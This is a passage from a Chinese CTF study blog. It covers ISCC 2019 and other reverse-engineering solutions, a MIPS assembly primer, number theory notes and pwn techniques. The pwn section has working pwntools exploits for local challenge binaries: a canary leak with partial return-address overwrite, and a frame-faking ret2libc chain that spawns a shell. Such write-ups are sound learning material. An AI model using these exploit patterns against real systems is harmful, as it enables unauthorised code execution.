alt="1"><br>如果这时根据malloc的数生成一个box啥的，在调试中的值和运行中的就会不一样<br>很恶心啊</p><h1 id="ISCC-2019"><a href="#ISCC-2019" class="headerlink" title="ISCC_2019"></a>ISCC_2019</h1><h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><p>简单的xor</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span> = &#x27;&#x27;<br><span class="hljs-attribute">flag</span> += chr(<span class="hljs-number">401978124</span>^<span class="hljs-number">0</span>x<span class="hljs-number">17</span>F<span class="hljs-number">5</span>B<span class="hljs-number">345</span>)<br><span class="hljs-attribute">flag</span> += chr(<span class="hljs-number">0</span>xF<span class="hljs-number">16</span>B<span class="hljs-number">77</span>E<span class="hljs-number">2</span>^<span class="hljs-number">4050352049</span>)<br><span class="hljs-attribute">flag</span> += chr(<span class="hljs-number">2998016260</span>^ <span class="hljs-number">0</span>xB<span class="hljs-number">2</span>B<span class="hljs-number">21947</span>)<br><span class="hljs-attribute">flag</span> += chr(<span class="hljs-number">1487534536</span>^ <span class="hljs-number">0</span>x<span class="hljs-number">58</span>A<span class="hljs-number">9</span>F<span class="hljs-number">98</span>B)<br><span class="hljs-attribute">flag</span> += chr(<span class="hljs-number">547986801</span>^ <span class="hljs-number">0</span>x<span class="hljs-number">20</span>A<span class="hljs-number">99</span>D<span class="hljs-number">0</span>A)<br><span class="hljs-attribute">flag</span> += chr(<span class="hljs-number">2530761537</span>^ <span class="hljs-number">0</span>x<span class="hljs-number">96</span>D<span class="hljs-number">85</span>B<span class="hljs-number">20</span>)<br><span class="hljs-attribute">flag</span> += chr(<span class="hljs-number">0</span>xBBEA<span class="hljs-number">9</span>A<span class="hljs-number">56</span>^ <span class="hljs-number">0</span>xBBEA<span class="hljs-number">9</span>A<span class="hljs-number">3</span>E)<br><span class="hljs-attribute">flag</span> += chr(<span class="hljs-number">894512607</span>^ <span class="hljs-number">0</span>x<span class="hljs-number">35512</span>DBE)<br><span class="hljs-attribute">flag</span> += chr(<span class="hljs-number">674815144</span>^ <span class="hljs-number">0</span>x<span class="hljs-number">2838</span>DCF<span class="hljs-number">7</span>)<br><span class="hljs-attribute">flag</span> += chr(<span class="hljs-number">1319231476</span>^ <span class="hljs-number">0</span>x<span class="hljs-number">4</span>EA<span class="hljs-number">1</span>DF<span class="hljs-number">87</span>)<br><span class="hljs-attribute">flag</span> += chr(<span class="hljs-number">3794652292</span>^ <span class="hljs-number">0</span>xE<span class="hljs-number">22</span>DCCED)<br><span class="hljs-attribute">flag</span> += chr(<span class="hljs-number">3710674499</span>^ <span class="hljs-number">0</span>xDD<span class="hljs-number">2</span>C<span class="hljs-number">662</span>E)<br><span class="hljs-attribute">flag</span> += chr(<span class="hljs-number">275462068</span>^ <span class="hljs-number">0</span>x<span class="hljs-number">106</span>B<span class="hljs-number">37</span>C<span class="hljs-number">4</span>)<br><span class="hljs-attribute">flag</span> += chr(<span class="hljs-number">1186218498</span>^ <span class="hljs-number">0</span>x<span class="hljs-number">46</span>B<span class="hljs-number">4426</span>E)<br><span class="hljs-attribute">flag</span> += chr(<span class="hljs-number">2858928017</span>^ <span class="hljs-number">0</span>xAA<span class="hljs-number">67</span>C<span class="hljs-number">7</span>F<span class="hljs-number">4</span>)<br><span class="hljs-attribute">flag</span> += chr(<span class="hljs-number">1925213922</span>^ <span class="hljs-number">0</span>x<span class="hljs-number">72</span>C<span class="hljs-number">06</span>EBD)<br><span class="hljs-attribute">flag</span> += chr(<span class="hljs-number">2953936653</span>^ <span class="hljs-number">0</span>xB<span class="hljs-number">0117</span>F<span class="hljs-number">7</span>F)<br><span class="hljs-attribute">flag</span> += chr(<span class="hljs-number">4179334025</span>^ <span class="hljs-number">0</span>xF<span class="hljs-number">91</span>B<span class="hljs-number">93</span>EC)<br><span class="hljs-attribute">flag</span> += chr(<span class="hljs-number">3560761698</span>^ <span class="hljs-number">0</span>xD<span class="hljs-number">43</span>CE<span class="hljs-number">914</span>)<br><span class="hljs-attribute">flag</span> += chr(<span class="hljs-number">4142533768</span>^ <span class="hljs-number">0</span>xF<span class="hljs-number">6</span>EA<span class="hljs-number">0</span>CED)<br><span class="hljs-attribute">flag</span> += chr(<span class="hljs-number">1076496869</span>^ <span class="hljs-number">0</span>x<span class="hljs-number">402</span>A<span class="hljs-number">0997</span>)<br><span class="hljs-attribute">flag</span> += chr(<span class="hljs-number">2913777524</span>^ <span class="hljs-number">0</span>xADACB<span class="hljs-number">707</span>)<br><span class="hljs-attribute">flag</span> += chr(<span class="hljs-number">3885782341</span>^ <span class="hljs-number">0</span>xE<span class="hljs-number">79</span>C<span class="hljs-number">5520</span>)<br><span class="hljs-attribute">flag</span> += chr(<span class="hljs-number">1266072881</span>^ <span class="hljs-number">0</span>x<span class="hljs-number">4</span>B<span class="hljs-number">76</span>BD<span class="hljs-number">4</span>C)<br><span class="hljs-attribute">print</span> flag<br></code></pre></td></tr></table></figure><h2 id="android"><a href="#android" class="headerlink" title="android"></a>android</h2><p>题目明显是让你用z3去约束求解的<br>简单来说就是奇偶分组录入然后进行一堆条件限制<br>多解//iscc正常操作<br>最后找到一段有意义的字符串<br>还有就是明明就是一个re题在里面藏了字符串<br><img src="2.png" alt="2"><br>一个base64<br>看到这边可能有人要开喷了怎么会有这种题目<br>没办法，iscc正常操作。<br>而且装上后发现没有输入框<br>//估计是本来有输入框，技术支持发现多解后，就把输入框关了<br>//沙雕题</p><h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><p>pwn的高地和私地题目搞反了把。。。<br>高地过于简单，就一个栈溢出，后门都写好了<br>私地呢。。。</p><p>总结一下。。。第一次打国家级的比赛，氛围很。。。差<br>北理工主办方俩支队伍被锤的20开外<br>py的太多了<br>心知肚明</p><h1 id="mips入门"><a href="#mips入门" class="headerlink" title="mips入门"></a>mips入门</h1><h2 id="mips64题目大致写法"><a href="#mips64题目大致写法" class="headerlink" title="mips64题目大致写法"></a>mips64题目大致写法</h2><p>1.运行<br>qemu-mips64 ./mips64</p><p>2.调试<br>qemu-mips64 -g 9999 ./mips64<br>开启端口<br>下面可以选择用gdb还是用ida调<br>//不怎么喜欢ida，还是用ida来静态分析比较好<br>//而且ida调一次崩一次，下面与gdb交互的窗口也莫名不能用</p><p>2.1<br>gdb调试<br>/usr/local/mips64-gdb/bin/mips64-linux-gdb<br>file mips64<br>set architecture mips:isa64r2   //设置类型<br>target remote localhost:9999</p><p>3.断点<br>使用-strace参数<br>明确分析断点<br>然后疯狂下断点查看</p><p>还需要注意一下流程图。主要还是定位关键代码<br>配合猜测基本可以做</p><h2 id="mips32汇编"><a href="#mips32汇编" class="headerlink" title="mips32汇编"></a>mips32汇编</h2><p>首先有贼多的寄存器。。。</p><h3 id="存储指令集-相对偏移"><a href="#存储指令集-相对偏移" class="headerlink" title="存储指令集/相对偏移"></a>存储指令集/相对偏移</h3><p>l s指令就是加载和存储<br>la就是lea取地址<br>lw    $t2, ($t0)<br>()就是[]指针<br>sw    $t2, -12($t0)<br>相对偏移什么的标记在前面<br>sw是前面赋给后面<br>相对偏移也要注意类型<br>sw $t1, 4($t0)<br>就是给$t0下一个word赋值$t1</p><h3 id="算术指令集"><a href="#算术指令集" class="headerlink" title="算术指令集"></a>算术指令集</h3><p>add $t0,$t1,$t2 # $t0 = $t1 + $t2;<br>sub    $t2,$t3,$t4    #  $t2 = $t3 Ð $t4<br>addi    $t2,$t3, 5    #  $t2 = $t3 + 5;   “add immediate” (no sub immediate)<br>addu    $t1,$t6,$t7    #  $t1 = $t6 + $t7;   add as unsigned integers<br>subu    $t1,$t6,$t7    #  $t1 = $t6 + $t7;   subtract as unsigned integers<br>很简单易懂啊</p><h3 id="控制流指令集"><a href="#控制流指令集" class="headerlink" title="控制流指令集"></a>控制流指令集</h3><p>if else<br>b    target        #  unconditional branch to program label target<br>beq    $t0,$t1,target    #  branch to target if  $t0 = $t1<br>blt    $t0,$t1,target    #  branch to target if  $t0 &lt; $t1<br>ble    $t0,$t1,target    #  branch to target if  $t0 &lt;= $t1<br>bgt    $t0,$t1,target    #  branch to target if  $t0 &gt; $t1<br>bge    $t0,$t1,target    #  branch to target if  $t0 &gt;= $t1<br>bne    $t0,$t1,target    #  branch to target if  $t0 != $t1<br>和x86大同小异<br>把b改成j的话就认识了</p><p>jump<br>j    target    　　　　 #  unconditional jump to program label target<br>jr    $t3        #  jump to address contained in $t3 (“jump register”)</p><p>call<br>jal    sub_label    #  “jump and link”</p><p>return<br>jr    $ra //$ra保存着返回地址<br>如果多次调用函数<br>返回地址就用栈来存储</p><h2 id="mips64"><a href="#mips64" class="headerlink" title="mips64"></a>mips64</h2><p>其实没多大变化。。。<br>32位word，64位double<br>运算类：add变成dadd，同理sub/mul/div变成dsub/dmul/ddiv<br>访存: lw变成ld, sw变成sd<br>寄存器名： S0/S1…   全部变为r0/r1/… / r31</p><h3 id="具体注意点"><a href="#具体注意点" class="headerlink" title="具体注意点"></a>具体注意点</h3><p>movz r1，r2,r3      If(r3==0) r1=r2<br>movn reg,reg,reg    move if register not equal to zero<br>mov.s freg,freg     move floating-point(single FP )<br>mov.d freg,freg     move floating-point(double FP )<br>mtc1 reg,freg       move data from integer register to FP register<br>mfc1 reg,freg       move data from FP register to integer register<br>lui  reg,imm        load upper half of register immediate</p><h3 id="标志位"><a href="#标志位" class="headerlink" title="标志位"></a>标志位</h3><p>c.lt.d freg,freg    set FP flag if less than//在double范围内，如果是float则是c.lt.s，查看fpu可用i fl<br>c.eq.d freg,freg    set FP flag if equal to<br>c.le.d freg,freg    set FP flag if less than or equal to</p><p>slt reg,reg,reg     set if less than<br>dslt reg,reg,reg<br>sltu reg,reg,reg<br>slti reg,reg,imm<br>sltiu reg,reg,imm</p><h3 id="跳转"><a href="#跳转" class="headerlink" title="跳转"></a>跳转</h3><p>j imm           jump to address                            (不会保存返回地址)<br>jr reg          jump to address in register             （不会保存返回地址）<br>jal imm         跳转到imm地址并且将返回地址记录在寄存器ra中（会保存）<br>jalr reg        jump and link to address in register  （会保存）</p><p>beqz reg,imm        branch if register is equal to zero<br>bnez reg,imm        branch if register is not equal to zero<br>beq reg,reg,imm     branch if pair of registers are equal<br>bne reg,reg,imm     branch if pair of registers are not equal<br>bc1t imm            branch to address if FP flag is TRUE<br>bc1f imm            branch to address if FP flag is FALSE</p><h3 id="控制"><a href="#控制" class="headerlink" title="控制"></a>控制</h3><p>nop             no operation<br>halt            stops the program</p><p>另外mips64遇到跳转指令时都会使用到分支延迟</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-class">.text</span>:<span class="hljs-number">0000000120003</span>C20 loc_120003C20:<br><span class="hljs-selector-class">.text</span>:<span class="hljs-number">0000000120003</span>C20                 c<span class="hljs-selector-class">.lt</span><span class="hljs-selector-class">.s</span>  <span class="hljs-variable">$fcc6</span>, <span class="hljs-variable">$f1</span>, <span class="hljs-variable">$f0</span><br><span class="hljs-selector-class">.text</span>:<span class="hljs-number">0000000120003</span>C24                 bc1f    <span class="hljs-variable">$fcc6</span>, loc_120003B24<br><span class="hljs-selector-class">.text</span>:<span class="hljs-number">0000000120003</span>C28                 ld      <span class="hljs-variable">$t9</span>, -<span class="hljs-number">0</span>x7F68(<span class="hljs-variable">$gp</span>)<br><span class="hljs-selector-class">.text</span>:<span class="hljs-number">0000000120003</span>C2C                 ld      <span class="hljs-variable">$a0</span>, -<span class="hljs-number">0</span>x7F78(<span class="hljs-variable">$gp</span>)<br><span class="hljs-selector-class">.text</span>:<span class="hljs-number">0000000120003</span>C30                 ld      <span class="hljs-variable">$a1</span>, -<span class="hljs-number">0</span>x7F58(<span class="hljs-variable">$gp</span>)<br></code></pre></td></tr></table></figure><p>如下面的代码片段，bc1f是跳转指令，满足条件跳转至 loc_120003B24 。无论是否满足跳转条件，都会先执行 ld $t9, -0x7F68($gp) 那条指令，再跳到 loc_120003B24 或者 ld $a0, -0x7F78($gp) 。gdb断点只能下到 0x120003C24 或 0x120003C2C，无法下到0x120003C28。<br>当然平时调试的时候也能多注意像$a0这样的<br>因为mips调用函数的参数往往放在这<br>而像这样的寄存器往往存着你的输入<br>好了mips暂且告一段落。。。</p><h1 id="pwn-learning"><a href="#pwn-learning" class="headerlink" title="pwn_learning"></a>pwn_learning</h1><h2 id="stack-smash"><a href="#stack-smash" class="headerlink" title="stack_smash"></a>stack_smash</h2><p>有canary情况下可以使用<br>但是只能达成任意地址读写</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs sqf">void <span class="hljs-variable">__attribute__</span> ((noreturn)) <span class="hljs-variable">__stack_chk_fail</span> (void)<br>&#123;<br>  <span class="hljs-variable">__fortify_fail</span> (<span class="hljs-string">&quot;stack smashing detected&quot;</span>);<br>&#125;<br>void <span class="hljs-variable">__attribute__</span> ((noreturn)) internal_function <span class="hljs-variable">__fortify_fail</span> (const char *msg)<br>&#123;<br>  <span class="hljs-comment">/* The loop is added only to keep gcc happy.  */</span><br>  <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>    <span class="hljs-variable">__libc_message</span> (<span class="hljs-number">2</span>, <span class="hljs-string">&quot;*** %s ***: %s terminated\n&quot;</span>,<br>                    msg, <span class="hljs-variable">__libc_argv</span>[<span class="hljs-number">0</span>] ?: <span class="hljs-string">&quot;&lt;unknown&gt;&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>主要原理就是覆盖argv[0]为你想读出的地址<br>具体可见jarvisoj的smash<br>当然这题还涉及到了elf的映射<br>bss段会被映射俩次<br>在pwndbg中使用search ‘xxx’就行啦</p><h2 id="partial-overwrite"><a href="#partial-overwrite" class="headerlink" title="partial overwrite"></a>partial overwrite</h2><p>例题是安恒杯月赛的babypie<br>这边涉及到的知识点比如说read函数不补\0<br>外加上printf所以我们可以leak canary<br>还有就是off by one<br>程序开启了pie但是保存的返回地址与后门函数只有最后一字节不同<br>所以可以off by one<br><img src="3.png" alt="3"><br>可以看到输入40个a后<br>canary结尾处是0<br>我们可以输入41个覆盖0<br>这样就能把canary打出</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-built_in">from</span> pwn import *<br><span class="hljs-keyword">a</span> = <span class="hljs-built_in">process</span>(<span class="hljs-string">&quot;./babypie&quot;</span>)<br>pay = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">41</span><br><span class="hljs-keyword">a</span>.recvuntil(<span class="hljs-string">&quot;Name:&quot;</span>)<br><span class="hljs-keyword">a</span>.<span class="hljs-built_in">send</span>(pay)<br><span class="hljs-keyword">a</span>.recvuntil(pay)<br>canary = <span class="hljs-string">&#x27;\0&#x27;</span> + <span class="hljs-keyword">a</span>.recv(<span class="hljs-number">7</span>)<br>pay2 = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">40</span> + canary + <span class="hljs-string">&#x27;bbbbbbbb&#x27;</span> + chr(<span class="hljs-number">0x3e</span>)<br><span class="hljs-keyword">a</span>.<span class="hljs-built_in">send</span>(pay2)<br><span class="hljs-keyword">a</span>.interactive()<br></code></pre></td></tr></table></figure><h2 id="frame-faking"><a href="#frame-faking" class="headerlink" title="frame faking"></a>frame faking</h2><p>看着头疼的东西<br>睡前写一波<br>大致原理已经搞得差不多了<br>主要是溢出位数不够构造ebp进行俩次leave ret<br>为什么要俩次leave ret？<br>其实目的是让你构造得ebp赋值给esp<br>然后esp改变，第二次ret得地址就为esp那边的了<br>假如说我们把构造的ebp整到一个我们可控得内存区域<br>这样就能劫持控制流了<br>当然frame faking有个使用前提<br>一个是知道栈地址，还有就是能栈溢出且有一块写的内存区域<br>和劫持栈指针有点相似<br>明天再把题目整一下<br>花式栈溢出即将完结~~~<br>撒花~~~</p><h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><p>安恒杯的over</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">from</span> pwn import *<br><span class="hljs-attribute">p_r</span> = <span class="hljs-number">0</span>x<span class="hljs-number">400793</span><br><span class="hljs-attribute">elf</span> = ELF(<span class="hljs-string">&quot;./over&quot;</span>)<br><span class="hljs-attribute">libc</span> = elf.libc<br><span class="hljs-attribute">a</span> = process(<span class="hljs-string">&quot;./over&quot;</span>)<br><span class="hljs-attribute">pay</span> = &#x27;a&#x27;*<span class="hljs-number">80</span><br><span class="hljs-attribute">a</span>.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>)<br><span class="hljs-attribute">a</span>.send(pay)<br><span class="hljs-attribute">a</span>.recvuntil(&#x27;a&#x27;*<span class="hljs-number">80</span>)<br><span class="hljs-attribute">fake</span> = u<span class="hljs-number">64</span>(a.recvuntil(<span class="hljs-string">&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>: ].ljust(<span class="hljs-number">8</span>, &#x27;\<span class="hljs-number">0</span>&#x27;)) - <span class="hljs-number">0</span>x<span class="hljs-number">70</span><br><span class="hljs-attribute">a</span>.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>)<br><span class="hljs-attribute">pay</span>  = &#x27;<span class="hljs-number">11111111</span>&#x27; + p<span class="hljs-number">64</span>(p_r) + p<span class="hljs-number">64</span>(elf.got[&#x27;puts&#x27;]) + p<span class="hljs-number">64</span>(elf.symbols[&#x27;puts&#x27;]) + p<span class="hljs-number">64</span>(<span class="hljs-number">0</span>x<span class="hljs-number">400676</span>)<br><span class="hljs-attribute">pay</span> += &#x27;a&#x27;*(<span class="hljs-number">0</span>x<span class="hljs-number">50</span>-len(pay))<br><span class="hljs-attribute">pay</span> += p<span class="hljs-number">64</span>(fake)<br><span class="hljs-attribute">pay</span> += p<span class="hljs-number">64</span>(<span class="hljs-number">0</span>x<span class="hljs-number">4006</span>BE)<br><span class="hljs-attribute">a</span>.send(pay)<br><span class="hljs-attribute">print</span> &#x27;dividing line&#x27;<br><span class="hljs-attribute">base</span> = u<span class="hljs-number">64</span>(a.recvuntil(<span class="hljs-string">&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>: ].ljust(<span class="hljs-number">8</span>, &#x27;\<span class="hljs-number">0</span>&#x27;)) - libc.sym[&#x27;puts&#x27;]<br><span class="hljs-attribute">sys</span> = libc.symbols[&#x27;execve&#x27;] + base<br><span class="hljs-attribute">sh</span> = libc.search(&#x27;/bin/sh&#x27;).next() + base<br><span class="hljs-attribute">p_p_r</span> = <span class="hljs-number">0</span>x<span class="hljs-number">1150</span>c<span class="hljs-number">9</span> + base<br><span class="hljs-attribute">pay2</span> = &#x27;<span class="hljs-number">22222222</span>&#x27;<br><span class="hljs-attribute">pay2</span> += p<span class="hljs-number">64</span>(p_r) + p<span class="hljs-number">64</span>(sh)<br><span class="hljs-attribute">pay2</span> += p<span class="hljs-number">64</span>(p_p_r) + p<span class="hljs-number">64</span>(<span class="hljs-number">0</span>) + p<span class="hljs-number">64</span>(<span class="hljs-number">0</span>)<br><span class="hljs-attribute">pay2</span> += p<span class="hljs-number">64</span>(sys)<br><span class="hljs-attribute">pay2</span> += &#x27;b&#x27;*(<span class="hljs-number">80</span>-len(pay<span class="hljs-number">2</span>))<br><span class="hljs-attribute">pay2</span> += p<span class="hljs-number">64</span>(fake-<span class="hljs-number">0</span>x<span class="hljs-number">30</span>)<br><span class="hljs-attribute">pay2</span> += p<span class="hljs-number">64</span>(<span class="hljs-number">0</span>x<span class="hljs-number">4006</span>BE)<br><span class="hljs-attribute">a</span>.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>)<br><span class="hljs-attribute">print</span> &#x27;****************&#x27;<br><span class="hljs-attribute">print</span> hex(fake)<br><span class="hljs-attribute">print</span> &#x27;****************&#x27;<br><span class="hljs-attribute">print</span> hex(base)<br><span class="hljs-attribute">a</span>.send(pay<span class="hljs-number">2</span>)<br><span class="hljs-attribute">a</span>.interactive()<br></code></pre></td></tr></table></figure><p>这题配合了ret2libc<br>写完后从原理上面想了想确实和劫持栈指针一个样。。。</p><h1 id="信安数基学习"><a href="#信安数基学习" class="headerlink" title="信安数基学习"></a>信安数基学习</h1><p>信安数基这玩意其实感觉特别重要啊<br>和密码学有点链接，大一的时候看过点密码学书，感觉能看懂原理但是不能深入理解毕竟涉及到了大部分的数学知识<br>正好趁着暑假学习一下</p><h2 id="整除-amp-性质"><a href="#整除-amp-性质" class="headerlink" title="整除&amp;性质"></a>整除&amp;性质</h2><p>简记b|a为b整除a<br>性质1：b与-b，a/b都遍历了a的因数<br>性质2：传递性 比如abc!=0,且都为整数，有b|a,c|b,则c|a<br>当然在加法运算中这也成立<br>b|a,b|c,所以b|(a+-c)<br>性质3：线性性质<br>c|a,c|b对于任意整数s，t有 c|s<em>a+t</em>b<br>这边还能推广为多个线性组合就不写出来了</p><h2 id="素数与厄拉托塞师筛法"><a href="#素数与厄拉托塞师筛法" class="headerlink" title="素数与厄拉托塞师筛法"></a>素数与厄拉托塞师筛法</h2><p>前面这一部分都不怎么难。。。简单讲讲<br>素数什么的就不介绍了<br>这一章涉及的大部分都在大一上c语言见过<br>比如不小于n的素数啊<br>就是从小于等于根号n开始<br>定理1：设n为正合数，p是n的一个大于1的最小正因数，则p一定是素数且p&lt;=根号n<br>定理2：对于正整数n，如果对于所有素数p&lt;=根号n都有p|n,则n为素数<br>定理3：素数有无穷多个</p><h2 id="欧几里得除法-amp-素数平凡判别"><a href="#欧几里得除法-amp-素数平凡判别" class="headerlink" title="欧几里得除法&amp;素数平凡判别"></a>欧几里得除法&amp;素数平凡判别</h2><p>定理：对于a,b俩个整数，其中b大于0，则存在唯一的整数q,r使得 a = q*b + r,  (0 &lt;= r &lt; b)<br>所以b|a &lt;=&gt; r = 0<br>很明显q是a被b除的不完全商，r是余数<br>C语言中的/ 和 %的结果。。。<br>定义：即[x]为整数部分小于等于x的最大整数<br>所以q就可以用[a/b]来表示<br>素数的平凡判别简单来说就是对于正整数n，把小于等于根号n的素数s全拿出来<br>如果n%s != 0对所有s都成立<br>则n为素数</p><h2 id="最大公因数-amp-广义欧几里得除法"><a href="#最大公因数-amp-广义欧几里得除法" class="headerlink" title="最大公因数&amp;广义欧几里得除法"></a>最大公因数&amp;广义欧几里得除法</h2><p>大部分都学过<br>注意一个就是 对于 a = q<em>b + c 有(a,b) = (b,c)<br>广义欧几里得除法就是用来求解最大公因数的通过递归可以实现<br>比如求a,b得最大公因数<br>a = c</em>b + r<br>b = c1<em>r + r1<br>r = c2</em>r1<br>所以最大公因数是r1<br>//可以轻松编程实现</p><h2 id="贝祖等式"><a href="#贝祖等式" class="headerlink" title="贝祖等式"></a>贝祖等式</h2><p>s<em>a + t</em>b = (a,b)<br>其实就是把广义欧几里得除法反过来用<br>互素的话则值为1</p><h2 id="最大公因数的进一步性质"><a href="#最大公因数的进一步性质" class="headerlink" title="最大公因数的进一步性质"></a>最大公因数的进一步性质</h2><p>大致就是涉及到多个整数最大公因数计算</p><h2 id="整数的进一步性质和最小公倍数"><a href="#整数的进一步性质和最小公倍数" class="headerlink" title="整数的进一步性质和最小公倍数"></a>整数的进一步性质和最小公倍数</h2><p>任意整数都可以化为若干素数的乘积<br>其实如果不是素数的话，那个数也能继续化简，稍微想下就可以得到</p><h2 id="同余"><a href="#同余" class="headerlink" title="同余"></a>同余</h2><p>同余和取模有关啦<br>密码学中也有讲到这一概念<br>a = b + q*m<br>就有 a%m = b%m<br>还有许多推论如 整数n被3整除 同余 系数和被三整除</p><h1 id="VM逆向"><a href="#VM逆向" class="headerlink" title="VM逆向"></a>VM逆向</h1><p>以前vm一直是用angr啥的骚操作来解决的<br>这个坑必须填一下<br>这次来试一下手逆</p><h2 id="RCTF-2018"><a href="#RCTF-2018" class="headerlink" title="RCTF 2018"></a>RCTF 2018</h2><p>很带劲啊这题<br>先是跟了半天的vm然后发现他在打出input the flag<br>。。。<br><img src="6.png" alt="6"><br>可以看到case 0xb就是putchar<br>录入flag就是在case 0xa那边了，因为用的是getchar所以调试一波可以发现输入的flag长度<br>应该为32<br>然后程序对它进行了异或操作。。。<br>这边的异或实现形式有点奇葩<br>c = ~(a&amp;b)<br>temp1 = ~(c&amp;a)<br>temp2 = ~(c&amp;b)<br>a^b = ~(temp1&amp;temp2)<br>没错就是这样的。。。<br>至于这是xor证明起来也不难<br>直接枚举一下//一开始我也没有想到这个方法，听室友说的<br>然后会有个验证，验证就是个if分支判断<br><img src="7.png" alt="7"><br>如果输入是错的直接就putchar wrong</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dns">a = [<span class="hljs-number">9</span>,<span class="hljs-number">0</span>x58,<span class="hljs-number">0</span>xc,<span class="hljs-number">0</span>xa,<span class="hljs-number">0</span>x5f,<span class="hljs-number">0</span>x58,<span class="hljs-number">8</span>,<span class="hljs-number">0</span>x5a,<span class="hljs-number">0x56,0x5</span>,<span class="hljs-number">0x53,0x51</span>,<span class="hljs-number">0</span>x<span class="hljs-number">57,1,0x54</span>,<span class="hljs-number">0x53,0x18</span>,<span class="hljs-number">0x48,0x49</span>,<span class="hljs-number">0</span>x1f,<span class="hljs-number">0</span>x12,<span class="hljs-number">0</span>x4b,<span class="hljs-number">0</span>x1d,<span class="hljs-number">0x10,0x17</span>,<span class="hljs-number">0x40,0x47</span>,<span class="hljs-number">0x15,0x14</span>,<span class="hljs-number">0x43,0x18</span>,<span class="hljs-number">0</span>x10]<br>flag = &#x27;&#x27;<br>for i in range(len(a)):<br>    flag += chr(a[len(a)-<span class="hljs-number">1</span>-i]^(<span class="hljs-number">0</span>x20+i))<br>print flag<br></code></pre></td></tr></table></figure><p>最后的脚本。。。<br>第一次写vm<br>属实笨比</p><h1 id="De1CTF-2019"><a href="#De1CTF-2019" class="headerlink" title="De1CTF 2019"></a>De1CTF 2019</h1><h2 id="Re-Sign"><a href="#Re-Sign" class="headerlink" title="Re_Sign"></a>Re_Sign</h2><p>UPX加壳<br>脱完后发现。。。。。。<br>代码量极其长//那时候还不知道是易语言写的<br>跟了一会发现就是个改了码表的base64<br>sub_401233解密码表<br>后面把加密后的下标与正确下标相比较</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go">a = <span class="hljs-string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&#x27;</span><br>b = <span class="hljs-string">&#x27;0123456789QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm&#x27;</span><br>c = <span class="hljs-string">&#x27;H6AfGzIeXjSCP3IaHzSBHhRCEFRCOhRWHAohFjxjOeqjCU&#x27;</span><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i in <span class="hljs-keyword">range</span>(<span class="hljs-built_in">len</span>(c)):<br>    <span class="hljs-keyword">for</span> j in <span class="hljs-keyword">range</span>(<span class="hljs-built_in">len</span>(a)):<br>        <span class="hljs-keyword">if</span> c[i] == b[j]:<br>            flag += a[j]<br>            <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span> flag<br></code></pre></td></tr></table></figure><p>解一下base64即可</p><h2 id="Cplusplus"><a href="#Cplusplus" class="headerlink" 